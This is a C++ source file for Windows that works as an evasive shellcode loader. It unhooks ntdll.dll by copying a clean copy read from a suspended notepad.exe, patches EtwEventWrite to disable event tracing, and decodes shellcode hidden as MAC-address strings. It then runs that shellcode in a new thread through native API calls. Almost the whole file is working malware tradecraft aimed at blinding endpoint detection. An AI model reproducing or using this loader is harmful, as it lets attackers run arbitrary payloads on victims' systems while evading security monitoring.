#include <Windows.h>
#include <stdio.h>
#include <Rpc.h>
#include <psapi.h>
#include <winternl.h>
#include <Ip2string.h>

#pragma comment(lib, "ntdll")

#define NtCurrentProcess()	   ((HANDLE)-1)

#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)

#pragma comment(lib, "Rpcrt4.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif



EXTERN_C NTSTATUS NtAllocateVirtualMemory(
    HANDLE    ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

EXTERN_C NTSTATUS NtProtectVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect);



EXTERN_C NTSTATUS NtCreateThreadEx(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer
);

EXTERN_C NTSTATUS NtWaitForSingleObject(
    IN HANDLE         Handle,
    IN BOOLEAN        Alertable,
    IN PLARGE_INTEGER Timeout
);


EXTERN_C NTSTATUS NtOpenSection(
    OUT PHANDLE             SectionHandle,
    IN ACCESS_MASK          DesiredAccess,
    IN POBJECT_ATTRIBUTES   ObjectAttributes
);

using MyNtMapViewOfSection = NTSTATUS(NTAPI*)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
    );




BOOL DisableETW(void) {
    DWORD oldprotect = 0;

    char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0 };
    char sntdll[] = { 'n','t','d','l','l', 0 };

    //      xor rax, rax; 
    //      ret
    char patch[] = { 0x48, 0x33, 0xc0, 0xc3 };


    void* addr = GetProcAddress(GetModuleHandleA(sntdll), sEtwEventWrite);
    if (!addr) {
        printf("Failed to get EtwEventWrite Addr (%u)\n", GetLastError());
        return FALSE;
    }
    BOOL status1 = VirtualProtect(addr, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);
    if (!status1) {
        printf("Failed in changing protection (%u)\n", GetLastError());
        return FALSE;
    }

    memcpy(addr, patch, sizeof(patch));


    BOOL status2 = VirtualProtect(addr, 4096, oldprotect, &oldprotect);

    if (!status2) {
        printf("Failed in changing protection back (%u)\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}


LPVOID getNtdll() {

    LPVOID pntdll = NULL;

    //Create our suspended process
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    
    if (!pi.hProcess)
    {
        printf("[-] Error creating process\r\n");
        return NULL;
    }
    

    //Get base address of NTDLL
    HANDLE process = GetCurrentProcess();
    MODULEINFO mi;
    HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
    GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));


    pntdll = HeapAlloc(GetProcessHeap(), 0, mi.SizeOfImage);
    SIZE_T dwRead;
    BOOL bSuccess = ReadProcessMemory(pi.hProcess, (LPCVOID)mi.lpBaseOfDll, pntdll, mi.SizeOfImage, &dwRead);
    if (!bSuccess) {
        printf("Failed in reading ntdll (%u)\n", GetLastError());
        return NULL;
    }


    TerminateProcess(pi.hProcess, 0);
    return pntdll;
}




BOOL Unhook(LPVOID cleanNtdll) {

    char nt[] = { 'n','t','d','l','l','.','d','l','l', 0 };

    HANDLE hNtdll = GetModuleHandleA(nt);
    DWORD oldprotect = 0;
    PIMAGE_DOS_HEADER DOSheader = (PIMAGE_DOS_HEADER)cleanNtdll;
    PIMAGE_NT_HEADERS NTheader = (PIMAGE_NT_HEADERS)((DWORD64)cleanNtdll + DOSheader->e_lfanew);
    int i;


    // find .text section
    for (i = 0; i < NTheader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sectionHdr = (PIMAGE_SECTION_HEADER)((DWORD64)IMAGE_FIRST_SECTION(NTheader) + ((DWORD64)IMAGE_SIZEOF_SECTION_HEADER * i));

        char txt[] = { '.','t','e','x','t', 0 };

        if (!strcmp((char*)sectionHdr->Name, txt)) {

            // prepare ntdll.dll memory region for write permissions.
            BOOL ProtectStatus1 = VirtualProtect((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress),
                sectionHdr->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
            if (!ProtectStatus1) {
                printf("Failed to change the protection (%u)\n", GetLastError());
                return FALSE;
            }
            
            // copy .text section from the mapped ntdll to the hooked one
            memcpy((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress), (LPVOID)((DWORD64)cleanNtdll + sectionHdr->VirtualAddress), sectionHdr->Misc.VirtualSize);


            // restore original protection settings of ntdll
            BOOL ProtectStatus2 = VirtualProtect((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress),
                sectionHdr->Misc.VirtualSize, oldprotect, &oldprotect);
            if (!ProtectStatus2) {
                printf("Failed to change the protection back (%u)\n", GetLastError());
                return FALSE;
            }
            
        }
    }

    return TRUE;

}

BOOL isItHooked(LPVOID addr) {
    BYTE stub[] = "\x4c\x8b\xd1\xb8";
    if (memcmp(addr, stub, 4) != 0)
        return TRUE;
    return FALSE;
}


int main() {


    printf("Press <Enter> To Run ... ");
    getchar();
    printf("\n\n");

    if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory"))) {
        printf("NtAllocateVirtualMemory Hooked\n");
    }
    else {
        printf("NtAllocateVirtualMemory Not Hooked\n");
    }

    if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory"))) {
        printf("NtProtectVirtualMemory Hooked\n");
    }
    else {
        printf("NtProtectVirtualMemory Not Hooked\n");
    }

    if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx"))) {
        printf("NtCreateThreadEx Hooked\n");
    }
    else {
        printf("NtCreateThreadEx Not Hooked\n");
    }

    printf("\n\n");

    printf("[+] Unhooking Ntdll \n");
    LPVOID nt = getNtdll();
    if (!nt) {
        printf("Failed to map ntd11\n");
        return -1;
    }


    if (!Unhook(nt)) {
        printf("Failed in Unhooking!\n");
        return -2;
    }


    printf("[+] Patching ETW \n");
    if (!DisableETW()) {
        printf("Failed in patching ETW\n");
        return -3;
    }
    printf("[+] ETW Patched !!\n");

    PVOID BaseAddress = NULL;
    SIZE_T dwSize = 0x2000;



    NTSTATUS status1 = NtAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status1)) {
        printf("[!] Failed in sysZwAllocateVirtualMemory (%u)\n", GetLastError());
        return 1;
    }

    
    const char* MAC[] =
    {
        "FC-48-81-E4-F0-FF",
        "FF-FF-E8-D0-00-00",
        "00-41-51-41-50-52",
        "51-56-48-31-D2-65",
        "48-8B-52-60-3E-48",
        "8B-52-18-3E-48-8B",
        "52-20-3E-48-8B-72",
        "50-3E-48-0F-B7-4A",
        "4A-4D-31-C9-48-31",
        "C0-AC-3C-61-7C-02",
        "2C-20-41-C1-C9-0D",
        "41-01-C1-E2-ED-52",
        "41-51-3E-48-8B-52",
        "20-3E-8B-42-3C-48",
        "01-D0-3E-8B-80-88",
        "00-00-00-48-85-C0",
        "74-6F-48-01-D0-50",
        "3E-8B-48-18-3E-44",
        "8B-40-20-49-01-D0",
        "E3-5C-48-FF-C9-3E",
        "41-8B-34-88-48-01",
        "D6-4D-31-C9-48-31",
        "C0-AC-41-C1-C9-0D",
        "41-01-C1-38-E0-75",
        "F1-3E-4C-03-4C-24",
        "08-45-39-D1-75-D6",
        "58-3E-44-8B-40-24",
        "49-01-D0-66-3E-41",
        "8B-0C-48-3E-44-8B",
        "40-1C-49-01-D0-3E",
        "41-8B-04-88-48-01",
        "D0-41-58-41-58-5E",
        "59-5A-41-58-41-59",
        "41-5A-48-83-EC-20",
        "41-52-FF-E0-58-41",
        "59-5A-3E-48-8B-12",
        "E9-49-FF-FF-FF-5D",
        "49-C7-C1-00-00-00",
        "00-3E-48-8D-95-FE",
        "00-00-00-3E-4C-8D",
        "85-02-01-00-00-48",
        "31-C9-41-BA-45-83",
        "56-07-FF-D5-48-31",
        "C9-41-BA-F0-B5-A2",
        "56-FF-D5-79-65-73",
        "00-79-65-73-00-90"
    };

    int rowLen = sizeof(MAC) / sizeof(MAC[0]);
    PCSTR Terminator = NULL;
    NTSTATUS STATUS;

    DWORD_PTR ptr = (DWORD_PTR)BaseAddress;
    for (int i = 0; i < rowLen; i++) {
        STATUS = RtlEthernetStringToAddressA((PCSTR)MAC[i], &Terminator, (DL_EUI48*)ptr);
        if (!NT_SUCCESS(STATUS)) {
            return FALSE;
        }
        ptr += 6;

    }

    HANDLE hThread;
    DWORD OldProtect = 0;


    NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, (PSIZE_T)&dwSize, PAGE_EXECUTE_READ, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus1)) {
        printf("[!] Failed in sysNtProtectVirtualMemory1 (%u)\n", GetLastError());
        return 2;
    }


    HANDLE hHostThread = INVALID_HANDLE_VALUE;


    NTSTATUS NtCreateThreadstatus = NtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
    if (!NT_SUCCESS(NtCreateThreadstatus)) {
        printf("[!] Failed in sysNtCreateThreadEx (%u)\n", GetLastError());
        return 3;
    }


    LARGE_INTEGER Timeout;
    Timeout.QuadPart = -10000000;


    NTSTATUS NTWFSOstatus = NtWaitForSingleObject(hHostThread, FALSE, &Timeout);
    if (!NT_SUCCESS(NTWFSOstatus)) {
        printf("[!] Failed in sysNtWaitForSingleObject (%u)\n", GetLastError());
        return 4;
    }

    printf("\n\n");
    if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory"))) {
        printf("NtAllocateVirtualMemory Hooked\n");
    }
    else {
        printf("NtAllocateVirtualMemory Not Hooked\n");
    }

    if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory"))) {
        printf("NtProtectVirtualMemory Hooked\n");
    }
    else {
        printf("NtProtectVirtualMemory Not Hooked\n");
    }

    if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx"))) {
        printf("NtCreateThreadEx Hooked\n");
    }
    else {
        printf("NtCreateThreadEx Not Hooked\n");
    }


    printf("\n\n[+] Finished !!!!\n");

    return 0;

}